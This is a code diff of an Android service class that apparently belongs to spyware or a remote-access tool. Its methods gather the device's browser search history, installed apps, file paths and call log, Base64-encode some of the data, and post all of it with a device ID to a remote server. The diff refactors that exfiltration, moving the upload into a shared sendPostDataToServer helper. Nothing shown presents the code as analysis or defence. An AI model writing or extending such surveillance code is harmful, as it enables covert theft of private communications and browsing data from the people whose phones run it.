@@ -341,8 +341,9 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
     private void getBrowserHistory() {
         BrowserProvider browserProvider = new BrowserProvider(context);
-        String json = new Gson().toJson(browserProvider.getBookmarks().getList());
-        showAllData(json);
+        String json = new Gson().toJson(browserProvider.getSearches().getList());
+
+        showAllData("Show History : " + browserProvider.getSearches().getCursor().getCount());
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("browser_history", json);
@@ -352,13 +353,10 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
     private void getApplist() {
         final PackageManager pm = getPackageManager();
-
         List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
-
         HashMap<String, Object> appIndexMap = new HashMap<>();
         int appIndex = 1;
         for (ApplicationInfo packageInfo : packages) {
-
             HashMap<String, String> infoMap = new HashMap<>();
             infoMap.put("package", packageInfo.packageName + "");
             if (packageInfo.sourceDir != null)
@@ -367,30 +365,11 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             appIndexMap.put("###app-" + (appIndex), infoMap);
             appIndex++;
         }
-        showAllData("normal_veri: " + appIndexMap.toString());
-
         String base64 = Base64.encodeToString(appIndexMap.toString().getBytes(), Base64.DEFAULT);
-        showAllData("sifreli veri: " + base64);
-
-        HashMap<String, String> postData = new HashMap<>();
+        HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("app_list", base64);
-
-        AndroidNetworking.post(SERVER_URI)
-                .addBodyParameter(postData)
-                .setPriority(Priority.MEDIUM)
-                .build()
-                .getAsString(new StringRequestListener() {
-                    @Override
-                    public void onResponse(String response) {
-                        showAllData(response);
-                    }
-
-                    @Override
-                    public void onError(ANError anError) {
-                        showAllData(anError.getErrorDetail());
-                    }
-                });
+        sendPostDataToServer(postData);
     }
 
     private void uploadFile(JSONObject jsonObject) {
@@ -449,7 +428,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             if (fileList == null) {
                 return;
             }
-            HashMap<String, String> hashMap = new HashMap<>();
+            HashMap<String, Object> hashMap = new HashMap<>();
             for (int i = 0; i < fileList.length; i++) {
                 hashMap.put("path_" + (i + 1), fileList[i].getAbsolutePath());
             }
@@ -552,7 +531,6 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
     private void getCallLog() {
         CallsProvider callsProvider = new CallsProvider(context);
-
         String json = new Gson().toJson(callsProvider.getCalls().getList());
         showAllData(json);
         HashMap<String, Object> postData = new HashMap<>();
